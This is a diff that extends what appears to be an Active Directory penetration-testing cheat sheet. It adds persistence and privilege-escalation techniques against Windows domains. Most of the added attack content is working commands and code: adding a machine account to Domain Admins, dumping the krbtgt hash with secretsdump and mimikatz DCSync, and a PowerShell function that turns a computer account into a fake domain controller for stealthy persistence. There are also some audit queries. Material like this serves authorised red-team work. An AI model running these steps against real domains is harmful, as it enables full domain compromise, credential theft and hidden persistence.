@@ -20,14 +20,34 @@ rpcclient -U '' -N 10.10.0.10 -c "querygroupmem 0x200" |  cut -d '[' -f 2 | cut 
 # Authenticated enumeration
 
 
-### Active Directory user description
+### Active Directory user and computer account description
 Using crackmapexec to get active directory user description
 ```
 crackmapexec ldap 10.10.0.10 -u jdoe -p Pass1234 -d company.com -M get-desc-users
 ```
 
+--> It is also extremely important to check for computer account description, as computer account are just AD object with description attribute.
+
 ### Resetting expired passwords remotely
 - https://www.n00py.io/2021/09/resetting-expired-passwords-remotely/
+
+### PASSWD_NOT_REQD
+If PASSWD_NOTREQD user-Account-Control Attribute Value bit is set then No password is required.  
+
+1) First collect the information from the domain controller:
+```
+python ldapdomaindump.py -u example.com\\john -p pass123 -d ';' 10.100.20.1
+```
+
+2) Once the dumping is done, get the list of users with the PASSWD_NOTREQD flag using the following command:
+```
+grep PASSWD_NOTREQD domain_users.grep | grep -v ACCOUNT_DISABLED | awk -F ';' '{print $3}'
+```
+
+Reset password of users who have PASSWD_NOTREQD flag set and have never set a password:
+```
+Get-ADUser -Filter "useraccountcontrol -band 32" -Properties PasswordLastSet | Where-Object { $_.PasswordLastSet -eq $null } | select SamAccountName,Name,distinguishedname | Out-GridView 
+```
 
 ### Machine Account Quota
 Identify machine account quota domain attribute:
@@ -113,7 +133,30 @@ crackmapexec smb rangeIP.txt -u jdoe -p Pass1234 -d company.com -M spooler | gre
 - https://github.com/Kevin-Robertson/Powermad
 > MachineAccountQuota (MAQ) is a **domain level attribute** that by default permits unprivileged users to attach up to **10** computers to an Active Directory (AD) domain
 
-Various tools exist which can create a machine account from the command line or from an implant such as **StandIn**, **SharpMad** and **PowerMad**.
+Various tools exist which can create a machine account from the command line or from an implant such as **StandIn**, **SharpMad** and **PowerMad**.  
+
+- Machine accounts created through MAQ are placed into the Domain Computers group
+--> In situations where the Domain Computers group has been granted extra privilege, it’s important to remember that this privilege also extends to unprivileged users through MAQ.  
+
+- The creator account is granted write access to some machine account object attributes. Normally, this includes the following attributes:
+
+1. AccountDisabled
+2. description
+3. displayName
+4. DnsHostName
+5. ServicePrincipalName
+6. userParameters
+7. userAccountControl
+8. msDS-AdditionalDnsHostName
+9. msDS-AllowedToActOnBehalfOfOtherIdentity
+10. samAccountName 
+
+- The machine account itself has write access to some of its own attributes. The list includes the msDS-SupportedEncryptionTypes attribute which can have an impact on the negotiated Kerberos encryption method.
+
+- The samAccountName can be changed to anything that doesn’t match a samAccountName already present in a domain.
+--> Interestingly, the samAccountName can even end in a space which permits mimicking any existing domain account. You can strip the $ character also. 
+
+<img src="./images/MAQSAMAccoutnName.png" width="250"/>
 
 ### Protected Users
 Well-known SID/RID: ```S-1-5-21-<domain>-525```
@@ -177,11 +220,11 @@ certutil.exe -config - -ping
 - https://github.com/PKISolutions/PSPKI
 - https://www.exandroid.dev/2021/06/23/ad-cs-relay-attack-practical-guide/
 
-#### ADCS WebDav + NTLM relay to LDAP
+### ADCS WebDav + NTLM relay to LDAP
 - https://twitter.com/tifkin_/status/1418855927575302144/photo/1
 - https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/adcs-+-petitpotam-ntlm-relay-obtaining-krbtgt-hash-with-domain-controller-machine-certificate#rbcd-remote-computer-takeover
 
-#### Exploiting machine accounts (WS01$)
+### Exploiting machine accounts (WS01$)
 - https://pentestlab.blog/2022/02/01/machine-accounts/
 - https://secarma.com/using-machine-account-passwords-during-an-engagement/
 
@@ -203,7 +246,7 @@ hash = hashlib.new('md4', passwd).digest()
 print binascii.hexlify(hash)
 ```
 
-#### Over-Pass-The-hash
+### Over-Pass-The-hash
 - blog.gentilkiwi.com/securite/mimikatz/overpass-the-hash
 
 Use the user or computer NTLM hash to request Kerberos tickets.
@@ -221,12 +264,18 @@ Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
 ```
 --> Error raised because of your local time, you need to synchronise the host with the DC: ```ntpdate <IP of DC>```
 
-#### Pass The ticket
+### Pass The ticket
 - https://book.hacktricks.xyz/windows/active-directory-methodology/pass-the-ticket
 
-#### Silver ticket
+### Silver ticket
 - https://adsecurity.org/?p=2011
 - https://pentestlab.blog/2022/01/17/domain-persistence-machine-account/
+
+### Kerberos Delegation
+- https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/
+- https://posts.specterops.io/a-case-study-in-wagging-the-dog-computer-takeover-2bcb7f94c783
+- https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html
+
 
 # Persistence
 
@@ -235,6 +284,11 @@ Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
 
 Machine accounts could be used as a backdoor for domain persistence by adding them to high privilege groups.
 
+```
+net group "Domain Admins" newMachine01$ /add /domain
+python3 secretsdump.py company.local/newMachine01\$:Password123@10.0.0.1 -just-dc-user krbtgt
+```
+
 #### Machine/Computer accounts 2 
 - https://stealthbits.com/blog/server-untrust-account/
 - https://github.com/STEALTHbits/ServerUntrustAccount
@@ -242,9 +296,77 @@ Machine accounts could be used as a backdoor for domain persistence by adding th
 
 > Even though that dumping passwords hashes via the DCSync technique is not new and SOC teams might have proper alerting in place, using a computer account to perform the same technique might be a more stealthier approach.
 
+- https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties
+
+Modification of the “userAccountControl” attribute can transform a computer account to a domain controller.
+
+Computer account to appear as a domain controller:
+- **userAccountControl** attribute needs to have the value of 0x2000 = ( SERVER_TRUST_ACCOUNT ) decimal : 8192
+--> Modification of this attribute requires domain administrator level privileges
+
+```
+Import-Module .\Powermad.psm1
+New-MachineAccount -MachineAccount newMachine01 -Domain company.local -DomainController dc01.company.local
+```
+By default new computer will have primary group ID 515 (RID for domain groups and represents that this is a domain computer)
+
+If you can modify the **userAccountControl** an therefore change the primary group ID. This attribute would be modified to have a value of **8192** the primary group id will change to **516** which belongs to domain controllers. 
+
+```
+Set-ADComputer newMachine01 -replace @{ "userAccountcontrol" = 8192 }
+```
+
+Most important bit of having a computer account to act as a domain controller is that the DCSync can be used on that arbitrary account instead of the legitimate domain controller.
+
+**Steps:**
+1. Creation a machine account
+2. Modifying **userAccountControl** to 8192
+3. Computer account is known its NTLM hash could be used to pass the hash (create new cmd.exe, mimikatz...)
+4. Command prompt will open under the context of the machine account --> DCSync KRBTG or whole identities
+```
+lsadump::dcsync /domain:purple.lab /user:krbtgt
+```
+**Automate technique 1:**
+- https://github.com/STEALTHbits/ServerUntrustAccount
+```
+Add-ServerUntrustAccount -ComputerName "newMachine01" -Password "Password123" -Verbose
+Invoke-ServerUntrustAccount -ComputerName "newMachine01" -Password "Password123" -MimikatzPath ".\mimikatz.exe"
+```
+
+**Automate technique 2:**
+PowerShell script to automate domain persistence via the userAccountControl active directory attribute. 
+```
+function Execute-userAccountControl
+{
+[CmdletBinding()]
+        param
+        (
+                [System.String]$DomainFQDN = $ENV:USERDNSDOMAIN,
+                [System.String]$ComputerName = 'Pentestlab',
+                [System.String]$OSVersion = '10.0 (18363)',
+                [System.String]$OS = 'Windows 10 Enterprise',
+                [System.String]$DNSName = "$ComputerName.$DomainFQDN",
+$MachineAccount = 'Pentestlab'
+        )
+$secureString = convertto-securestring "Password123" -asplaintext -force
+$VerbosePreference = "Continue"
+ 
+Write-Verbose -Message "Creating Computer Account: $ComputerName"
+New-ADComputer $ComputerName -AccountPassword $securestring -Enabled $true -OperatingSystem $OS -OperatingSystemVersion $OS_Version -DNSHostName
+$DNSName -ErrorAction Stop;
+Write-Verbose -Message "$ComputerName created!"
+Write-Verbose -Message "Attempting to establish persistence."
+Write-Verbose -Message "Changing the userAccountControl attribute of $MachineAccount computer to 8192."
+Set-ADComputer $MachineAccount -replace @{ "userAccountcontrol" = 8192 };
+Write-Verbose -Message "$MachineAccount is now a Domain Controller!"
+Write-Verbose -Message "Domain persistence established!You can now use the DCSync technique with Pentestlab credentials."
+$VerbosePreference = "Continue"
+}
+```
+
 # Post-Exploitation
 
-#### Computer accounts privesc
+### Computer accounts privesc
 > For example, if an admin server is joined to a group with backup rights on Domain Controllers, all an attacker needs to do is compromise an admin account with rights to that admin server and then get System rights on that admin server to compromise the domain.
 
 1. Compromise an account with admin rights to admin server.
@@ -275,6 +397,52 @@ Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
 
 ```
 lsassy -d company.local -u jdoe -p Pass1234 192.168.1.0/24
+```
+
+## Misc : AD Audit 
+#### LM password storage
+LM hash is an old deprecated method of storing passwords which has the following weaknesses:  
+- Password length is limited to 14 characters
+- Passwords that are longer than 7 characters are split into two and each half is hashed separately
+- All lower-case characters are converted to upper-case before hashing
+
+```
+grep -iv ':aad3b435b51404eeaad3b435b51404ee:' ntds.dit
+```
+#### Storing passwords using reversible encryption
+- https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption
+
+#### Inactive domain accounts
+```
+sort -t ';' -k 8 domain_users.grep | grep -v ACCOUNT_DISABLED | awk -F ';' '{print $3, $8}'
+```
+
+#### Privileged users with password reset overdue
+Once the dumping is done (ldapdomaindump), get the list of users with **AdminCount** attribute set to **1** by parsing the ‘domain_users.json’ file:
+```
+jq -r '.[].attributes | select(.adminCount == [1]) | .sAMAccountName[]' domain_users.json > privileged_users.txt
+```
+Then iterate through the list of privileged users, display their last password reset date (pwdLastSet) and sort it:
+```
+while read user; do grep ";${user};" domain_users.grep; done < privileged_users.txt | \
+  grep -v ACCOUNT_DISABLED | sort -t ';' -k 10 | awk -F ';' '{print $3, $10}'
+```
+
+#### Users with non-expiring passwords
+```
+grep DONT_EXPIRE_PASSWD domain_users.grep | grep -v ACCOUNT_DISABLED
+```
+
+#### Service account within privileged groups
+```
+net group "Schema Admins" /domain
+net group "Domain Admins" /domain
+net group "Enterprise Admins" /domain
+```
+
+#### AdminCount on regular users
+```
+jq -r '.[].attributes | select(.adminCount == [1]) | .sAMAccountName[]' domain_users.json
 ```
 
 ## Data-Exfiltration
